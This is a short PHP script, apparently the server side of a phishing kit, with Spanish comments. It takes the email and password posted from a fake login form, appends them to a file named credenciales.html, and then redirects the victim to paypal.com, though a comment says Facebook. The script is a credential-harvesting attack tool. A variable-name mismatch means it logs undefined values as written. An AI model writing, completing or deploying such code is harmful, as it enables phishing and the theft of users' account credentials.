<?php

$Correo = $_POST['login_email']; 

$Contraseña = $_POST['login_password'];

$SALTO="\r\n";

$f = fopen("credenciales.html", "a");
fwrite ($f, "----------------------------------".$SALTO.'Correo: '.$login_email.$SALTO.'Contraseña: '.$login_password.$SALTO."----------------------------------".$SALTO);
fclose($f);

sleep(2);

//Redireccione a la web original (Facebook)

header('Location: https://www.paypal.com');
?>